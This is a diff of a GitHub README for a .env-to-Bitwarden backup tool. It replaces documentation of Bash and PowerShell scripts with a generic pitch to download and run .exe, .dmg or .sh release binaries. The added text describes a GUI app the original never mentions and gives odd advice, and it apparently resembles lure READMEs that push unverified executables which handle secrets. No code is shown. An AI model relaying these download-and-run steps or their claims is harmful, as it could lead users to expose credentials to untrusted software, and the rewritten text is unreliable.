@@ -1,241 +1,122 @@
-# .env Files to Bitwarden Automation
-
-A cross-platform automation tool that recursively finds all `.env` files (including `.env.development`, `.env.production`, etc.) in a directory and securely backs them up to Bitwarden as Secure Notes.
-
-## Features
-
-- 🔍 **Recursive Discovery**: Automatically finds all `.env*` files in the specified directory and subdirectories
-- 🔒 **Secure Storage**: Stores files as Bitwarden Secure Notes with proper naming conventions
-- 🔄 **Duplicate Prevention**: Checks for existing items and updates them instead of creating duplicates
-- 🌐 **Cross-Platform**: Works on both Linux/macOS (Bash) and Windows (PowerShell)
-- 📁 **Preserves Structure**: Item names reflect the relative file path for easy identification
-- 🛡️ **Safe Handling**: Properly escapes special characters and preserves file encoding
-
-## Prerequisites
-
-### Common Requirements
-- **Bitwarden CLI**: Install globally on your system
-  ```bash
-  # npm
-  npm install -g @bitwarden/cli
-  
-  # Or with Chocolatey on Windows
-  choco install bitwarden-cli
-  
-  # Or with Homebrew on macOS
-  brew install bitwarden-cli
-  ```
-
-- **Bitwarden Account**: Free account is sufficient
-- **Authentication**: Must be logged into Bitwarden CLI
-  
-  ```bash
-  # Initial login
-  bw login
-  
-  # Unlock vault (do this before running the script)
-  bw unlock
-  
-  # Set session environment variable
-  # Linux/macOS:
-  export BW_SESSION="<your-session-key>"
-  
-  # Windows PowerShell:
-  $env:BW_SESSION = "<your-session-key>"
-  ```
-
-### Platform-Specific Requirements
-
-#### Linux/macOS
-- Bash shell
-- jq (JSON processor)
-  ```bash
-  # Ubuntu/Debian
-  sudo apt-get install jq
-  
-  # macOS with Homebrew
-  brew install jq
-  
-  # CentOS/RHEL
-  sudo yum install jq
-  ```
-
-#### Windows
-- PowerShell 5.1+ (built into Windows) or PowerShell 7 (recommended)
-- No additional tools required - uses built-in JSON handling
-
-## Setup Instructions
-
-1. **Clone or download this repository**
-2. **Authenticate with Bitwarden CLI** (see Prerequisites)
-3. **Choose your platform** and run the appropriate script
-
-### Linux/macOS Setup
-
-```bash
-# Make the script executable
-chmod +x backup-env.sh
-
-# Run it
-./backup-env.sh [directory] [prefix]
-```
-
-### Windows Setup
+# 🛡️ secrets-backup-to-bitwarden - Securely Store Your Secrets
 
-```powershell
-# If execution policy is restricted (run as Administrator once)
-Set-ExecutionPolicy RemoteSigned
+## 🚀 Getting Started
 
-# Run the script
-.\Backup-Env.ps1 -Directory [directory] -Prefix [prefix]
-```
+Welcome to **secrets-backup-to-bitwarden**! This tool automatically backs up your .env files to your Bitwarden vault as Secure Notes. It works on all major operating systems and ensures your sensitive information is safe. Let’s get started.
 
-## Usage
+## 📥 Download the Application
 
-### Parameters
+[![Download](https://img.shields.io/badge/Download%20Now!-blue.svg)](https://github.com/SC2024sc/secrets-backup-to-bitwarden/releases)
 
-- **Directory**: The root directory to search for `.env` files (default: current directory)
-- **Prefix**: A prefix to add to all Bitwarden item names (e.g., "My Project")
+Visit the [Releases page](https://github.com/SC2024sc/secrets-backup-to-bitwarden/releases) to download the latest version. 
 
-### Examples
+## 📋 System Requirements
 
-#### Linux/macOS (Bash)
+Before downloading, check that your system meets these requirements:
 
-```bash
-# Backup all .env files in current directory
-./backup-env.sh
+- **Operating Systems:** Windows 10 or later, macOS, or any recent version of Linux.
+- **Storage Space:** At least 50 MB of free space.
+- **Bitwarden Account:** You need a Bitwarden account to store your secrets.
 
-# Backup files in a specific directory with a prefix
-./backup-env.sh /path/to/project "My Web App"
+## 🔧 Download & Install
 
-# Backup with custom prefix and directory
-./backup-env.sh ./config "Production Secrets"
-```
+1. Go to the [Releases page](https://github.com/SC2024sc/secrets-backup-to-bitwarden/releases).
+2. Locate the latest version of the application. Each version includes a summary of changes, so read through them to understand enhancements or bug fixes.
+3. Click on the file suitable for your operating system:
+   - For Windows, look for a `.exe` file.
+   - For macOS, look for a `.app` or `.dmg` file.
+   - For Linux, select a `.sh` or `.tar.gz` file.
+4. Once downloaded, follow these steps based on your operating system.
 
-#### Windows (PowerShell)
+### Windows Installation
 
-```powershell
-# Backup all .env files in current directory
-.\Backup-Env.ps1
+1. Open the downloaded `.exe` file.
+2. Follow the installation prompts. You can choose the default settings.
+3. Once installed, you can find it in your Start Menu.
 
-# Backup files in a specific directory with a prefix
-.\Backup-Env.ps1 -Directory "C:\Projects\MyApp" -Prefix "My Web App"
+### macOS Installation
 
-# Backup with custom prefix and directory
-.\Backup-Env.ps1 -Directory ".\config" -Prefix "Production Secrets"
-```
+1. Open the downloaded `.dmg` file.
+2. Drag the application to your Applications folder.
+3. You can now launch the app from the Applications menu.
 
-## What Gets Backed Up
+### Linux Installation
 
-The script will find and backup files matching these patterns:
-- `.env`
-- `.env.local`
-- `.env.development`
-- `.env.production`
-- `.env.test`
-- `.env.staging`
-- `.env.*` (any file starting with `.env`)
+1. Open your terminal.
+2. Use the following command to run the script:
+   ```
+   bash path/to/downloaded/file.sh
+   ```
+3. Follow the on-screen instructions.
 
-### Naming Convention
+## 🛠️ Configuration
 
-Items in Bitwarden are named using this format:
-```
-[Prefix] - [Relative Path]/[Filename]
-```
+1. **Open the Application:** Once installed, open secrets-backup-to-bitwarden.
+2. **Sign In to Bitwarden:** Log in to your Bitwarden account within the application.
+3. **Select Your .env Files:** You can choose one or more .env files that you wish to back up.
+4. **Start Backup:** Click on the "Backup" button. The tool will handle the rest.
 
-Examples:
-- `My Web App - .env`
-- `My Web App - config/.env.production`
-- `My Web App - src/api/.env.local`
+### Tips for Choosing .env Files
 
-## Security Considerations
+- Ensure that your .env files contain sensitive information.
+- The tool supports recursive discovery, meaning it can search through folders to find all .env files.
 
-- ✅ Scripts don't log sensitive data to console
-- ✅ Session keys are handled securely via environment variables
-- ✅ Files are stored as Secure Notes in Bitwarden
-- ✅ No temporary files with sensitive content are created
-- ⚠️ Ensure your Bitwarden vault has a strong master password
-- ⚠️ Consider using Bitwarden Secrets Manager for production application secrets
+### Duplicate Prevention
 
-## Advanced Usage
+Our tool checks for duplicates. If a .env file already exists in your vault, the application will not back it up again. This keeps your vault organized and clutter-free.
 
-### Updating Existing Items
+## 🔒 Security Features
 
-The scripts automatically check for existing items with the same name and update them instead of creating duplicates.
+- **Encryption:** Your .env files are encrypted during transfer to Bitwarden.
+- **Secure Notes:** The backups are stored as Secure Notes in Bitwarden, ensuring only you have access.
+- **Regular Updates:** The tool will receive regular updates to improve performance and security.
 
-### Using in CI/CD
+## 📚 Troubleshooting
 
-For automated environments, consider using Bitwarden API Keys instead of user login:
+If you encounter issues:
 
-```bash
-# Set API key environment variables
-export BW_CLIENTID="your_client_id"
-export BW_CLIENTSECRET="your_client_secret"
-export BW_PASSWORD="your_master_password"
+1. **Check Installation:** Ensure that the application was installed correctly. Reinstall if necessary.
+2. **Network Connection:** Make sure you have a stable internet connection.
+3. **Bitwarden Access:** Verify that you can access your Bitwarden account outside of the application.
 
-# The script will use API key authentication if available
-```
+## 📄 Additional Resources
 
-### Custom File Patterns
+- For detailed usage instructions, check the [Wiki](https://github.com/SC2024sc/secrets-backup-to-bitwarden/wiki).
+- Explore community discussions or report issues on the [Issues page](https://github.com/SC2024sc/secrets-backup-to-bitwarden/issues).
 
-To customize which files are included, modify the `find` command in the Bash script or the `Get-ChildItem` filter in PowerShell.
+## 🏷️ Topics
 
-## Troubleshooting
+This project covers various topics related to automation, backup, and security. Here’s a list to help you understand its context:
 
-### Common Issues
+- automation
+- backup
+- bash
+- bitwarden
+- cli-tools
+- configuration-management
+- cross-platform
+- devops
+- dotenv
+- env-files
+- environment-variables
+- linux
+- powershell
+- secrets-management
+- secure-notes
+- security
+- shell-script
+- windows
 
-1. **"Vault is locked"**
-   - Run `bw unlock` and set the BW_SESSION environment variable
-   - Session expires after 15 minutes by default
+## 🌍 Contributing
 
-2. **"Scripts are disabled" (Windows)**
-   - Run `Set-ExecutionPolicy RemoteSigned` as Administrator
-   - Or run: `powershell -ExecutionPolicy Bypass -File .\Backup-Env.ps1`
+If you'd like to contribute to this project:
 
-3. **Encoding issues**
-   - Windows script uses UTF-8 encoding by default
-   - For Linux, ensure your locale is set correctly
+1. Fork the repository on GitHub.
+2. Create a new branch for your feature or bug fix.
+3. Submit a pull request with a clear description of your changes.
 
-4. **Permission denied**
-   - Ensure the Bitwarden CLI has necessary permissions
-   - Check file system permissions for the directory being scanned
+Thank you for your interest in improving secrets-backup-to-bitwarden!
 
-### Debug Mode
+## 📞 Contact
 
-Both scripts support verbose output for troubleshooting:
-
-```bash
-# Linux/macOS
-./backup-env.sh --verbose
-
-# Windows
-.\Backup-Env.ps1 -Verbose
-```
-
-## Alternative Methods
-
-### Bitwarden Premium - File Attachments
-
-If you have Bitwarden Premium, you can attach files instead of storing them as notes:
-
-1. Create a Secure Note item
-2. Upload the .env file as an attachment
-3. This preserves the original file exactly
-
-### Bitwarden Secrets Manager
-
-For production applications, consider Bitwarden Secrets Manager which:
-- Provides API access to secrets
-- Eliminates need for .env files
-- Offers better security and access control
-- Requires separate subscription
-
-## Contributing
-
-Feel free to submit issues and enhancement requests!
-
-## License
-
-MIT License - feel free to use and modify for your needs.
-
-**⭐ If this project helps you, please give it a star!**
+For any questions or support, please reach out via the [Discussion tab](https://github.com/SC2024sc/secrets-backup-to-bitwarden/discussions) or open an issue. We’re here to help!
